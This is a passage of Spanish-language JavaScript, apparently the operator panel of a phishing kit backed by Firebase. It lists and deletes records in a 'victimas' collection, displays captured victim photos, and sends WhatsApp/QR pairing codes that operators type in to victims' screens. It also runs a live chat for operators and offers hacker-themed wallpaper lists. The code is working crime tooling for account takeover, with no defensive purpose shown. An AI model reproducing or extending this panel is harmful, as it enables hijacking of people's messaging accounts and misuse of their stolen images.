            </a>
        </div>
    `;

    document.body.appendChild(overlay);

    // Cerrar con botón X
    document.getElementById("btnCerrarVisor").addEventListener("click", (e) => {
        e.stopPropagation();
        overlay.remove();
    });

    // Cerrar haciendo click fuera de la imagen
    overlay.addEventListener("click", (e) => {
        if (e.target === overlay) overlay.remove();
    });

    // Cerrar con ESC
    const cerrarConEsc = (e) => {
        if (e.key === "Escape") { overlay.remove(); document.removeEventListener("keydown", cerrarConEsc); }
    };
    document.addEventListener("keydown", cerrarConEsc);
}

// ── Mantener compatibilidad con llamadas antiguas ──────────────
window.mostrarFotoCompleta = (imageData) => {
    abrirVisorFoto(decodeURIComponent(imageData));
};

window.regresarAVictimas = () => {
    const vistaCompleta = $id("vista-completa-foto");
    const registros     = $id("registros");
    if (vistaCompleta) vistaCompleta.style.display = "none";
    if (registros)     registros.style.display     = "block";
};

// ── Enviar código WhatsApp / QR ────────────────────────────────
window.enviarCodigoAVictima = async (docId) => {
    const input  = document.getElementById(`input-code-${docId}`);
    const status = document.getElementById(`status-${docId}`);
    const codigo = input?.value.trim().toUpperCase();
    if (!codigo || codigo.length < 4) {
        mostrarNotif("❌ Ingresa un código válido (mínimo 4 caracteres)");
        return;
    }
    try {
        await updateDoc(doc(db, "panelUsers", miUserDocId, "victimas", docId), {
            codigo: codigo,
            status: "mostrando_codigo"
        });
        if (status) {
            status.innerHTML = `<span style="color:#25D366">✅ Código "${codigo}" enviado a la víctima</span>`;
        }
        mostrarNotif(`✅ Código ${codigo} enviado`);
        input.value = "";
    } catch (e) {
        console.error(e);
        mostrarNotif("❌ Error al enviar. Revisa Firebase.");
    }
};

// ── Eliminar víctima individual ────────────────────────────────
window.eliminarVictimaIndividual = async (docId) => {
    mostrarModalPro("ELIMINAR", "¿Eliminar este registro permanentemente?", "SÍ, ELIMINAR", "CANCELAR",
        async () => {
            try {
                await deleteDoc(doc(db, "panelUsers", miUserDocId, "victimas", docId));
                mostrarNotif("🗑 Registro eliminado");
            } catch (e) {
                mostrarNotif("❌ Error al eliminar");
            }
        }
    );
};
document.addEventListener('DOMContentLoaded', () => {
    const btnRegresar = $id("btn-regresar");
    if (btnRegresar) btnRegresar.addEventListener('click', regresarAVictimas);
});

window.vaciarMisVictimas = async () => {
    if (!miUserDocId) { mostrarNotif("Error: usuario no identificado"); return; }
    mostrarModalPro(
        "VACIAR VÍCTIMAS",
        "¿Borrar <b>TODAS</b> las víctimas? Acción <b style='color:#f00'>IRREVERSIBLE</b>.",
        "SÍ, BORRAR TODO", "CANCELAR",
        async () => {
            try {
                const snap = await getDocs(collection(db, "panelUsers", miUserDocId, "victimas"));
                if (snap.empty) { mostrarNotif("No hay víctimas para borrar."); return; }
                await Promise.all(snap.docs.map(d => deleteDoc(d.ref)));
                mostrarNotif("Todas las víctimas eliminadas.");
            } catch (e) {
                mostrarNotif("Error al borrar víctimas.");
            }
        }
    );
};

// ============================================================
//  USUARIOS ACTIVOS (ONLINE)
// ============================================================
async function actualizarOnline() {
    if (!miUserDocId) return;
    await setDoc(doc(db, "panelUsers", miUserDocId), {
        online: true,
        ultimaActividad: serverTimestamp()
    }, { merge: true });
    const q = query(collection(db, "panelUsers"), where("ultimaActividad", ">=", new Date(Date.now() - 60000)));
    onSnapshot(q, (snap) => {
        if ($id("contadorActivos")) $id("contadorActivos").textContent = snap.size;
    });
}
setInterval(actualizarOnline, 10000);

// ============================================================
//  MODAL PRO + NOTIFICACIÓN
// ============================================================
function mostrarModalPro(titulo, texto, btnSi, btnNo, callbackSi) {
    const modal = document.createElement("div");
    modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.97);z-index:99999;display:flex;justify-content:center;align-items:center;";
    modal.innerHTML = `
    <div style="background:#000;border:3px solid #0f0;padding:30px 40px;border-radius:12px;box-shadow:0 0 40px #0f0;text-align:center;font-family:monospace;max-width:90%;">
        <h2 style="color:#0f0;margin:0 0 20px;font-size:26px;text-shadow:0 0 15px #0f0;letter-spacing:2px;">${titulo}</h2>
        <p style="color:#0ff;font-size:17px;margin:15px 0;line-height:1.5;">${texto}</p>
        <div style="margin-top:25px;">
            <button id="modalSi" style="background:#0f0;color:#000;padding:12px 30px;margin:0 10px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:16px;">${btnSi}</button>
            ${btnNo ? `<button id="modalNo" style="background:#300;color:#0f0;padding:12px 30px;margin:0 10px;border:2px solid #0f0;border-radius:8px;cursor:pointer;font-size:16px;">${btnNo}</button>` : ""}
        </div>
    </div>`;
    document.body.appendChild(modal);
    $id("modalSi").onclick = () => { callbackSi(); modal.remove(); };
    if (btnNo) $id("modalNo").onclick = () => modal.remove();
}

function mostrarNotif(texto) {
    const n = document.createElement("div");
    n.textContent = texto;
    n.style.cssText = "position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#0f0;color:#000;padding:12px 30px;border-radius:10px;z-index:99999;font-family:monospace;font-weight:bold;box-shadow:0 0 20px #0f0;";
    document.body.appendChild(n);
    setTimeout(() => n.remove(), 2500);
}

// ============================================================
//  CHAT EN TIEMPO REAL
// ============================================================
function iniciarChat() {
    const msgContainer = $id("chatMessages");
    if (!msgContainer) return;
    const userActual = auth.currentUser;
    if (!userActual) return;
const uidUsuarioActual = userActual.uid;
    const sonidoMencion = new Audio("https://assets.mixkit.co/sfx/preview/mixkit-software-interface-remove-2577.mp3");
    sonidoMencion.volume = 0.4;
    let resetTimestamp = null;
    let mensajesCargados = new Set();

    onSnapshot(doc(db, "userChatStates", uidUsuarioActual), (docSnap) => {
        if (docSnap.exists() && docSnap.data().resetTimestamp) {
            resetTimestamp = docSnap.data().resetTimestamp;
            msgContainer.innerHTML = '<div style="text-align:center;color:#0f0;padding:30px;">Chat vaciado</div>';
            mensajesCargados.clear();
        }
    });

    const qRealtime = query(
        collection(db, "chatMensajes"),
        orderBy("fecha", "desc"),
        limit(10)
    );

    const unsubscribe = onSnapshot(qRealtime, (snapshot) => {
        snapshot.docChanges().forEach((change) => {
            const id   = change.doc.id;
            const data = change.doc.data();

            if (resetTimestamp && data.fecha && data.fecha.toMillis() < resetTimestamp.toMillis()) return;

            if (change.type === "added" && !mensajesCargados.has(id)) {
                if (mensajesCargados.size === 0) {
                    msgContainer.innerHTML = '<div style="text-align:center;color:#888;padding:20px;">Conectado al chat. Los mensajes nuevos aparecerán aquí.</div>';
                }
                agregarMensajeAlDOM(id, data, uidUsuarioActual);
                mensajesCargados.add(id);
                msgContainer.scrollTop = msgContainer.scrollHeight;
            }

            if (change.type === "modified") {
                const existente = msgContainer.querySelector(`[data-msg-id="${id}"]`);
                if (existente && data.eliminado) {
                    existente.innerHTML = `<em style="color:#888">[Este mensaje fue eliminado]</em>`;
                }
            }

            if (change.type === "removed") {
                const msgElement = msgContainer.querySelector(`[data-msg-id="${id}"]`);
                if (msgElement) msgElement.remove();
            }
        });
    });

    function agregarMensajeAlDOM(id, data, uidActual) {
        if (msgContainer.querySelector(`[data-msg-id="${id}"]`)) return;
        const esMensajeSistema = data.esMensajeSistema || false;
        const esMio  = data.uidRemitente === uidActual;
        const color  = data.colorChat || "#00ff00";
        const div    = document.createElement("div");
        div.dataset.msgId = id;

        if (esMensajeSistema) {
            div.style.cssText = "position:relative;padding:10px;background:rgba(255,0,0,0.2);margin:6px 0;border-radius:8px;border-left:4px solid #f00;word-wrap:break-word;color:#fff;font-weight:bold;text-align:center;";
        } else {
            div.style.cssText = "position:relative;padding:10px;background:rgba(0,255,0,0.15);margin:6px 0;border-radius:8px;border-left:4px solid #0f0;word-wrap:break-word;color:#fff;";
        }

        function safe(text) {
            const e = document.createElement("div");
            e.textContent = text || "";
            return e.innerHTML;
        }

        let textoLimpio = safe(data.texto);
        textoLimpio = textoLimpio
            .replace(/\*\*(.*?)\*\*/g, "<b>$1</b>")
            .replace(/__(.*?)__/g, "<u>$1</u>");

        if (data.texto && data.texto.includes("@")) {
            const miNombre = (userActual?.email?.split("@")[0] || "").toLowerCase();
            textoLimpio = textoLimpio.replace(/@([a-zA-Z0-9_]+)/g, (match, usuario) => {
                if (usuario.toLowerCase() === miNombre && data.uidRemitente !== uidActual) {
                    sonidoMencion.play().catch(() => {});
                    return `<span style="background:#f00;color:#fff;padding:2px 8px;border-radius:4px;font-weight:bold;animation:parpadeo 1s infinite">@${usuario}</span>`;
                }
                return `<span style="background:#800;color:#fff;padding:2px 8px;border-radius:4px;font-weight:bold;">@${usuario}</span>`;
            });
        }

        const nombreUsuario = safe(data.usuario || "Anon");
        div.innerHTML = `<strong style="color:${color}">${nombreUsuario}:</strong> <span>${textoLimpio}</span>`;

        const acciones = document.createElement("div");
        acciones.style.cssText = "position:absolute;top:5px;right:5px;opacity:0;transition:opacity 0.3s;";
        div.onmouseover = () => acciones.style.opacity = "1";
        div.onmouseout  = () => acciones.style.opacity = "0";

        const btnOcultar = document.createElement("button");
        btnOcultar.textContent = "Ocultar";
        btnOcultar.style.cssText = "background:#f30;color:#fff;padding:2px 6px;margin-right:4px;border:none;border-radius:4px;cursor:pointer;font-size:11px;";
        btnOcultar.onclick = (e) => { e.stopPropagation(); div.remove(); };
        acciones.appendChild(btnOcultar);

        if (esMio) {
            const btnEliminar = document.createElement("button");
            btnEliminar.textContent = "Eliminar";
            btnEliminar.style.cssText = "background:#f00;color:#fff;padding:2px 6px;border:none;border-radius:4px;cursor:pointer;font-size:11px;";
            btnEliminar.onclick = (e) => {
                e.stopPropagation();
                mostrarModalPro(
                    "ELIMINAR PARA TODOS",
                    "El mensaje será reemplazado por <b style='color:#888'>[Este mensaje fue eliminado]</b> en todos los dispositivos",
                    "ELIMINAR", "Cancelar",
                    async () => {
                        await updateDoc(doc(db, "chatMensajes", id), {
                            texto: "[Este mensaje fue eliminado]",
                            eliminado: true
                        });
                        mostrarNotif("Mensaje eliminado para todos");
                    }
                );
            };
            acciones.appendChild(btnEliminar);
        }

        div.appendChild(acciones);
        msgContainer.appendChild(div);
    }

    window.chatUnsubscribe = unsubscribe;

    // ── Envío de mensajes ────────────────────────────────────
    const enviarMensaje = async () => {
        const texto = $id("chatInput").value.trim();
        if (!texto) return;
        if (!(await checkAntiSpam(texto, uidUsuarioActual))) return;
        const nombreActual = $id("chatUsuario").value.trim() || "Anon";
        try {
            await updateDoc(doc(db, "panelUsers", uidUsuarioActual), { usuario: nombreActual });
        } catch (e) {
            console.error("Error actualizando nombre:", e);
        }
        try {
            await addDoc(collection(db, "chatMensajes"), {
                texto:       texto,
                usuario:     nombreActual,
                uidRemitente: uidUsuarioActual,
                fecha:       serverTimestamp(),
                colorChat:   $id("chatColor").value || "#00ff00"
            });
            $id("chatInput").value = "";
        } catch (e) {
            console.error("Error al enviar:", e);
            mostrarNotif("Error al enviar mensaje");
        }
    };

    $id("chatSend").onclick = enviarMensaje;
    $id("chatInput").addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); enviarMensaje(); }
    });

    // ── Vaciar chat (solo para mí) ───────────────────────────
    window.vaciarChat = async () => {
        mostrarModalPro("VACIAR CHAT", "Esto limpiará el chat solo para ti. ¿Continuar?", "VACIAR", "CANCELAR",
            async () => {
                try {
                    await setDoc(doc(db, "userChatStates", uidUsuarioActual), {
                        resetTimestamp: serverTimestamp()
                    }, { merge: true });
                    msgContainer.innerHTML = `<div style="text-align:center;color:#0f0;padding:30px;">Chat vaciado</div>`;
                    mensajesCargados.clear();
                    mostrarNotif("Chat vaciado exitosamente.");
                } catch (e) {
                    console.error("Error al vaciar:", e);
                }
            }
        );
    };
}

// ============================================================
//  CAMBIAR TEMA — COLORES
// ============================================================
window.abrirVentanaColores = () => {
    const v   = $id("ventanaColores");
    const box = $id("todosColores");
    v.style.display = "flex";
    box.innerHTML   = "";
    for (let i = 0; i < 600; i++) {
        const color = `hsl(${i * 0.6},90%,60%)`;
        const d = document.createElement("div");
        d.style.cssText = `width:40px;height:40px;border-radius:5px;cursor:pointer;background:${color};border:2px solid #000;`;
        d.onclick = () => {
            document.querySelectorAll(".btn,#menuBtn,#fakeSelect,#panel,#ventanaAcortador,#registros,#chatInput,#chatMessages,#chatUsuario,#chatSend,.contactoLink,#usuariosOnlineBox div,input,textarea").forEach(el => {
                el.style.borderColor = color;
                el.style.boxShadow   = `0 0 15px ${color}`;
            });
            if (window.binarios) window.binarios.color = color;
            v.style.display = "none";
        };
        box.appendChild(d);
    }
};

window.restaurarTemaOriginal = () => {
    document.querySelectorAll(".btn,#menuBtn,#fakeSelect,#panel,#ventanaAcortador,#registros,#chatInput,#chatMessages,#chatUsuario,#chatSend,.contactoLink,#usuariosOnlineBox div,input,textarea").forEach(el => {
        el.style.borderColor = "#00ff00";
        el.style.boxShadow   = "0 0 15px #00ff00";
    });
    if (window.binarios) window.binarios.color = "#00ff00";
    $id("ventanaColores").style.display = "none";
};

window.cerrarVentanaColores = () => $id("ventanaColores").style.display = "none";

// ============================================================
//  FONDOS — ENLACES
// ============================================================
const imagenesEnlaces = [
    "https://i.postimg.cc/Kzd3dV54/360-F-641949215-SRk6Gy-MXUSbp-Hzpi7knb-HHjpua-ZF6Ffy.jpg",
    "https://i.postimg.cc/P53xg9tm/360-F-574955019-gk0Efa-Pbwa-Iz-Rf3Ht-S8KJd-Kmdu-Ox8V5G.jpg",
    "https://i.postimg.cc/0yyW5WSz/71bb561f7df207bd3b10f9ecdfe5d6be.png",
    "https://i.postimg.cc/GpSZ10Sw/76be013858034851a9fbfae176741356.webp",
    "https://i.postimg.cc/gkqQ2LBK/kali-linux-os-dragon-japanese-9bmrmf3ea24e3uwe.jpg",
    "https://i.postimg.cc/VNSKnJD5/linux-mint-linux-computer-hd-wallpaper-thumb.jpg",
    "https://i.postimg.cc/cJKFwvTP/top-10-hackers-of-all-time-the-real-list.jpg",
    "https://i.postimg.cc/fb6BKMrY/vetor-do-cranio-do-fundo-do-ataque-do-hacker-cibernetico-42077-12551.jpg",
    "https://i.postimg.cc/13TCMbXk/hacker-mirando-la-camara-con-una-mascara-facial-fondo-de-pantalla-tema-oscuro-generado-por.jpg",
    "https://i.postimg.cc/QdLTXr4q/0lu7hombgh871.jpg",
    "https://i.postimg.cc/wjc7gRsg/0Zbj-LS.jpg",
    "https://i.postimg.cc/RhsLPb4j/1.jpg",
    "https://i.postimg.cc/sDMYjmVy/112976872-m-webp-width-1170-name-112976872-m.jpg",
    "https://i.postimg.cc/6Qnz90fN/240508-8.jpg",
    "https://i.postimg.cc/9Mf4xX0m/34.jpg",
    "https://i.postimg.cc/T2C0Yhg7/6a792500-63b5-11f0-8dbd-f3d32ebd3327.jpg",
    "https://i.postimg.cc/28W19Kkz/757aab31c810686b617bc58d4285ad8e.jpg",
    "https://i.postimg.cc/vTk6xRQb/Alexandra-Sasha-cyber-security-hacker-cool-computer-binary-code-770cfb43-762a-4503-a16f-0735ae3bf602.png",
    "https://i.postimg.cc/50Pz1YTx/An-Ninh-Mang-2.jpg",
    "https://i.postimg.cc/s2mQ9GVK/anonymous-hackers-wallpaper-preview.jpg",
    "https://i.postimg.cc/1tSB4qvN/articulos-45009.jpg",
    "https://i.postimg.cc/dtN5nD0K/bjaeq21knen81.png",
    "https://i.postimg.cc/mrLhDZQN/blood-dragon-1920x1080-red-wallpaper-thumb.jpg",
    "https://i.postimg.cc/k5mKydKz/Cyber-Security-Threats-min-resized-89e4bf5bf7c909abfce90d645349cdbb4456e945.png",
    "https://i.postimg.cc/PJxm8zY2/hacker-attack-975yt.jpg",
    "https://i.postimg.cc/5975WTWR/hacker-attack-breach-freepik.jpg",
    "https://i.postimg.cc/WzXXB16X/Hackers-2.jpg",
    "https://i.postimg.cc/FKVcWnxL/hackers-pose-one-type-of-cybersecurity-threat-to-small-businesses.jpg",
    "https://i.postimg.cc/cCpr4Qm6/HD-wallpaper-anonymous-truth-world-save.jpg",
    "https://i.postimg.cc/SR2nhZcf/large.jpg",
    "https://i.postimg.cc/3J0G5wBQ/luminous-red-anonymous-2wrm4j7avzuqqm4d.jpg",
    "https://i.postimg.cc/50m3z2rK/pngtree-d-render-of-computer-screen-terminal-with-hacker-code-streaming-down-image-3880541.png",
    "https://i.postimg.cc/MHKYm82H/pngtree-hacker-programmer-on-neon-background-picture-image-15707642.png",
    "https://i.postimg.cc/Kcq7hwh1/shutterstock-1916985977-e1703134556975.jpg",
    "https://i.postimg.cc/XJN5Tc2h/Top-5-Cybersecurity-Threats-in-2024-and-How-to-Mitigate-Them-scaled.jpg",
    "https://i.postimg.cc/CxWmTtDQ/wp15527523.jpg"
];

window.mostrarOcultarImagenesFondoEnlaces = () => {
    const cont  = $id("imagenesFondoEnlaces");
    const lista = $id("imagenesEnlacesLista");
    cont.style.display = cont.style.display === "block" ? "none" : "block";
    if (cont.style.display === "block" && lista.innerHTML === "") {
        imagenesEnlaces.forEach(img => {
            const el = document.createElement("img");
            el.src = img;
            el.style.cssText = "width:100%;height:auto;cursor:pointer;border:3px solid #0f0;border-radius:8px;margin:6px 0;box-shadow:0 0 15px #0f0;";
            el.onclick = () => {
                $id("optionsList").style.backgroundImage = `url(${img})`;
                $id("optionsList").style.backgroundSize  = "cover";
                localStorage.setItem("fondoEnlaces", img);
                cont.style.display = "none";
            };
            lista.appendChild(el);
        });
    }
};

// ============================================================
//  FONDOS — INICIO
// ============================================================
const imagenesInicio = [
    "https://i.postimg.cc/d18JVxYv/images-(57).jpg",
    "https://i.postimg.cc/TY2TT0NB/264ff8b84e19d157fc9cb9f9698abe72.jpg",
    "https://i.postimg.cc/52TJqV9M/images-(56).jpg",
    "https://i.postimg.cc/hjbqBQLS/images-(55).jpg",
    "https://i.postimg.cc/YqyBMHWS/images-(54).jpg",
    "https://i.postimg.cc/XvdRfBDw/HD-wallpaper-hacker-hack.jpg",
    "https://i.postimg.cc/WzWCNGh4/images-(53).jpg",
    "https://i.postimg.cc/Sxz34z4T/images-(52).jpg",
    "https://i.postimg.cc/3wXq45dF/images-(51).jpg",
    "https://i.postimg.cc/zXyPwRyv/images-(50).jpg",
    "https://i.postimg.cc/xd2xSxtK/images-(49).jpg",
    "https://i.postimg.cc/Px62YthZ/images-(48).jpg",
    "https://i.postimg.cc/VvpgZDJB/images-(47).jpg",
    "https://i.postimg.cc/y8FjnhsS/images-(46).jpg",
    "https://i.postimg.cc/WzF6Zg5V/images-(45).jpg",
    "https://i.postimg.cc/7PdjWV8m/images-(44).jpg",
    "https://i.postimg.cc/dVmXDc7X/images-(43).jpg",
    "https://i.postimg.cc/q715Xcxx/images-(42).jpg",
    "https://i.postimg.cc/5yCKVhdm/images-(41).jpg",
    "https://i.postimg.cc/Hxf3B6cH/images-(40).jpg",
    "https://i.postimg.cc/yYCvRrCP/images-(39).jpg",
    "https://i.postimg.cc/Z5KPPG7p/images-(38).jpg",
    "https://i.postimg.cc/T3wm5r10/images-(37).jpg",
    "https://i.postimg.cc/TYk5xp0S/images-(36).jpg",
    "https://i.postimg.cc/02r2pZGy/images-(35).jpg",
    "https://i.postimg.cc/pT2PyBX8/1.jpg",
    "https://i.postimg.cc/mDbThS2z/16eb525d0e0462d64cb411bd8e64f22d-(1).jpg",
    "https://i.postimg.cc/26zC3x8j/9b1ec57e6c3138a53edbfe5a4b59c5ba-(1).jpg",
    "https://i.postimg.cc/d1qJD9t7/images-(24).jpg",
    "https://i.postimg.cc/3RK3WZJw/images-(26).jpg",
    "https://i.postimg.cc/wv693kT9/images-(27).jpg",
    "https://i.postimg.cc/HL0ppNHL/images-(28).jpg",
    "https://i.postimg.cc/jj6ss1Kb/images-(29).jpg",
    "https://i.postimg.cc/SKLyyPqN/images-(30).jpg",
    "https://i.postimg.cc/W4m22yjV/images-(32).jpg",
    "https://i.postimg.cc/bv0zz58f/images-(33).jpg",
    "https://i.postimg.cc/rpG88HT7/images-(34).jpg",
    "https://i.postimg.cc/5t407KG4/hacker-background-h6eyqo91lpkgq4my.jpg",
    "https://i.postimg.cc/x1stx8Tn/03cc17bcbadd24576e56973a97466661.jpg",
    "https://i.postimg.cc/RhXHS3YB/1447928de98a856b3d422a20079c1ba3.jpg",
    "https://i.postimg.cc/hGzb205x/158fbf8276529dc1e0d3c60846736890.jpg",
    "https://i.postimg.cc/qMvKmLtQ/185387.jpg",
    "https://i.postimg.cc/2SCK9gQh/1MM-380.webp",
    "https://i.postimg.cc/bwGtPw9f/2f7da32bdb8b8e7f320c7ce2ae69a28a.jpg",
    "https://i.postimg.cc/c4n9J0m3/360-F-206197131-3z-Cz-OXo-Hnh-ABEk-XGbqb-Dbmd-Bw-MGos-DIl.jpg",
    "https://i.postimg.cc/c4wpbQVy/360-F-598226410-hwu0HTRm-Ikoygfb-ADWLg0Es6fgv7c-Qq0.jpg",
    "https://i.postimg.cc/y8TwV767/360-F-608789044-me2Pt-F6ogx-ZKxd-Vzr-Blmt2ZYq-Mo-Z5z0E.jpg",
    "https://i.postimg.cc/wTg29L1x/36e29fb333167866e9f4961fd686cc6a.jpg",
    "https://i.postimg.cc/7ZpTZrK5/46c72b16317fef529fa5595143f6e8bc.jpg",
    "https://i.postimg.cc/90W9HPJK/4b77e726b288a4d816cb2e3c194b8954.jpg",
    "https://i.postimg.cc/TwvmCvmP/54006b42e589a12e78abd06ac6550805.jpg",
    "https://i.postimg.cc/YCSxW7fB/56eebd8d4ff4117b40cc8b38d6383378.jpg",
    "https://i.postimg.cc/0yrpNfPg/596ab1abdadd14f5d4b159256b8dce41.jpg",
    "https://i.postimg.cc/BQBhFNrX/5b3bfd4d477b5d3768c39bd7d721d16c.jpg",
    "https://i.postimg.cc/bYTbHMvY/5de38645b8a8a7edbf104a4cf3b967be.jpg",
    "https://i.postimg.cc/44M2Zmzs/79065a72faea7decf81ebd10de644c32.jpg",
    "https://i.postimg.cc/HnByYJNb/7cca66e6bc4a1ba447e7819463202526.jpg",
    "https://i.postimg.cc/5tTpJrzd/a0808bb2f535b0b544f7725ebc2cb13b.jpg",
    "https://i.postimg.cc/PrSWhcGC/a5cc22c43642ee40a75665208c8d388d.jpg",
    "https://i.postimg.cc/5Ng3yyzq/Anonymous-Earth-iPhone-Wallpaper-4K.jpg",
    "https://i.postimg.cc/k4NSHYFN/c0de7e8eab6a3d39238d36732ada3ade.jpg",
    "https://i.postimg.cc/FzgxjsnW/c6d8a194464d693fd533fd10500781e7.jpg",
    "https://i.postimg.cc/DfdQp0xf/cfd6c4a02a9237921c1d1c414c831031.jpg",
    "https://i.postimg.cc/FHGnMGGm/concepto-de-seguridad-hacker-sin-rostro-en-el-trabajo-con-la-inscripcion-pirateria-et.jpg",
    "https://i.postimg.cc/ZnhcByjC/d69d3152570a367eecb6ca3b52cdf720.jpg",
    "https://i.postimg.cc/G3sV4F3Q/depositphotos-710393540-stock-photo-faceless-hacker-hacking-inscription-binary.webp",
    "https://i.postimg.cc/VvRjJZJ0/desktop-wallpaper-guy-fawkes-mask-anon-mask.jpg",
    "https://i.postimg.cc/WpMSRXb8/desktop-wallpaper-iphone-for-iphone-8-iphone-8-plus-iphone-6s-iphone-6s-plus-iphone-x-and-ipod-touch.jpg",
    "https://i.postimg.cc/d0yr2Vhf/e83ca84415892f958189823dbf647e34.jpg",
    "https://i.postimg.cc/K8Vt3M8B/fbc0925ccbc21d2bfa35fe57d606a528.jpg",
"https://i.postimg.cc/tTJDGjVv/fondo-de-codigo-verde-pirateria-en-curso.jpg",
    "https://i.postimg.cc/2SNHbMcH/G6ba-Fm.jpg",
    "https://i.postimg.cc/Y9vVfg1X/hacker-g1e3a44200-1920-b6ba00f811758a41c98bff2db4b9e3e4-2000.jpg",
    "https://i.postimg.cc/HxFNSxz5/hacker-group-names-are-now-absurdly-out-of-control-v0-e5o1bw2DPr666vpx8NI3CZm-BCo-ESLyjff-QOo-Kn-N-k.jpg",
    "https://i.postimg.cc/FzcBw4CG/hacking-ciberseguridad.jpg",
    "https://i.postimg.cc/4dpvgxZJ/HD-wallpaper-anonymous-hack.jpg",
    "https://i.postimg.cc/6qwr5x5m/HD-wallpaper-anonymous-mask-smoke-iphone-iphone-iphone.jpg",
    "https://i.postimg.cc/jqN3xRv8/HD-wallpaper-kali-linux-neon-kali-linux-neon-thumbnail.jpg",
    "https://i.postimg.cc/GhC796Sf/images-r-bCqBCLR5XiHul6s3TDDxD71QMB273IbthMfxg75k8GkKqBTmzDOYA5YujiWfmd3yjPBGAyVPn6LJDQe.webp",
    "https://i.postimg.cc/KYRQdbRr/kali-linux-neon-dragon-968bqdlzy2n7tfu3.webp",
    "https://i.postimg.cc/90GLJBr3/kali-linux-silver-dragon-vj6bgoy7ysr3s6ag.jpg",
    "https://i.postimg.cc/vHrKzGVy/pngtree-security-concept-lock-on-digital-screen-locks-hacker-protection-photo-picture-image-6526616.png",
    "https://i.postimg.cc/jC0hfnXc/the-anonymus-guy-lb.jpg",
    "https://i.postimg.cc/Y9Lnm774/wired-placeholder-dummy.jpg",
    "https://i.postimg.cc/Jz7p5Z8x/wp13404605.jpg",
    "https://i.postimg.cc/KY67wMXb/wp14671539.jpg",
    "https://i.postimg.cc/6pVMdcFT/wp2697320.jpg"
];

window.mostrarOcultarImagenesFondoInicio = () => {
    const cont  = $id("imagenesFondoInicio");
    const lista = $id("imagenesInicioLista");
    cont.style.display = cont.style.display === "block" ? "none" : "block";
    if (cont.style.display === "block" && lista.innerHTML === "") {
        imagenesInicio.forEach(img => {
            const el = document.createElement("img");
            el.src = img;
            el.style.cssText = "width:100%;height:auto;cursor:pointer;border:3px solid #0f0;border-radius:8px;margin:6px 0;box-shadow:0 0 15px #0f0;";
            el.onclick = () => {
                document.body.style.background = `url('${img}') center/cover no-repeat fixed`;
                localStorage.setItem("fondoInicio", img);
                cont.style.display = "none";
            };
            lista.appendChild(el);
        });
    }
};

function cargarFondosGuardados() {
    const fondoEnlaces = localStorage.getItem("fondoEnlaces");
    const fondoInicio  = localStorage.getItem("fondoInicio");
    if (fondoEnlaces && $id("optionsList")) {
        $id("optionsList").style.backgroundImage = `url(${fondoEnlaces})`;
        $id("optionsList").style.backgroundSize  = "cover";
    }
    if (fondoInicio) {
        document.body.style.background = `url('${fondoInicio}') center/cover no-repeat fixed`;
    }
}
window.addEventListener("load", cargarFondosGuardados);

// ============================================================
//  FONDO MENÚ LATERAL
// ============================================================
const imagenesMenuLateral = [
    "https://i.postimg.cc/d18JVxYv/images-(57).jpg",
    "https://i.postimg.cc/TY2TT0NB/264ff8b84e19d157fc9cb9f9698abe72.jpg",
    "https://i.postimg.cc/52TJqV9M/images-(56).jpg",
    "https://i.postimg.cc/hjbqBQLS/images-(55).jpg",
    "https://i.postimg.cc/YqyBMHWS/images-(54).jpg",
    "https://i.postimg.cc/XvdRfBDw/HD-wallpaper-hacker-hack.jpg",
    "https://i.postimg.cc/WzWCNGh4/images-(53).jpg",
    "https://i.postimg.cc/Sxz34z4T/images-(52).jpg",
    "https://i.postimg.cc/3wXq45dF/images-(51).jpg",
    "https://i.postimg.cc/zXyPwRyv/images-(50).jpg",
    "https://i.postimg.cc/xd2xSxtK/images-(49).jpg",
    "https://i.postimg.cc/Px62YthZ/images-(48).jpg",
    "https://i.postimg.cc/VvpgZDJB/images-(47).jpg",
    "https://i.postimg.cc/y8FjnhsS/images-(46).jpg",
    "https://i.postimg.cc/WzF6Zg5V/images-(45).jpg",
    "https://i.postimg.cc/7PdjWV8m/images-(44).jpg",
    "https://i.postimg.cc/dVmXDc7X/images-(43).jpg",
    "https://i.postimg.cc/q715Xcxx/images-(42).jpg",
    "https://i.postimg.cc/5yCKVhdm/images-(41).jpg",
    "https://i.postimg.cc/Hxf3B6cH/images-(40).jpg",
    "https://i.postimg.cc/yYCvRrCP/images-(39).jpg",
    "https://i.postimg.cc/Z5KPPG7p/images-(38).jpg",
    "https://i.postimg.cc/T3wm5r10/images-(37).jpg",
    "https://i.postimg.cc/TYk5xp0S/images-(36).jpg",
    "https://i.postimg.cc/02r2pZGy/images-(35).jpg",
    "https://i.postimg.cc/pT2PyBX8/1.jpg",
    "https://i.postimg.cc/mDbThS2z/16eb525d0e0462d64cb411bd8e64f22d-(1).jpg",
    "https://i.postimg.cc/26zC3x8j/9b1ec57e6c3138a53edbfe5a4b59c5ba-(1).jpg",
    "https://i.postimg.cc/d1qJD9t7/images-(24).jpg",
    "https://i.postimg.cc/3RK3WZJw/images-(26).jpg",
    "https://i.postimg.cc/wv693kT9/images-(27).jpg",
    "https://i.postimg.cc/HL0ppNHL/images-(28).jpg",
    "https://i.postimg.cc/jj6ss1Kb/images-(29).jpg",
    "https://i.postimg.cc/SKLyyPqN/images-(30).jpg",
    "https://i.postimg.cc/W4m22yjV/images-(32).jpg",
    "https://i.postimg.cc/bv0zz58f/images-(33).jpg",
    "https://i.postimg.cc/rpG88HT7/images-(34).jpg",
    "https://i.postimg.cc/5t407KG4/hacker-background-h6eyqo91lpkgq4my.jpg",
    "https://i.postimg.cc/x1stx8Tn/03cc17bcbadd24576e56973a97466661.jpg",
    "https://i.postimg.cc/RhXHS3YB/1447928de98a856b3d422a20079c1ba3.jpg",
    "https://i.postimg.cc/hGzb205x/158fbf8276529dc1e0d3c60846736890.jpg",
    "https://i.postimg.cc/qMvKmLtQ/185387.jpg",
    "https://i.postimg.cc/2SCK9gQh/1MM-380.webp",
    "https://i.postimg.cc/bwGtPw9f/2f7da32bdb8b8e7f320c7ce2ae69a28a.jpg",
    "https://i.postimg.cc/c4n9J0m3/360-F-206197131-3z-Cz-OXo-Hnh-ABEk-XGbqb-Dbmd-Bw-MGos-DIl.jpg",
    "https://i.postimg.cc/c4wpbQVy/360-F-598226410-hwu0HTRm-Ikoygfb-ADWLg0Es6fgv7c-Qq0.jpg",
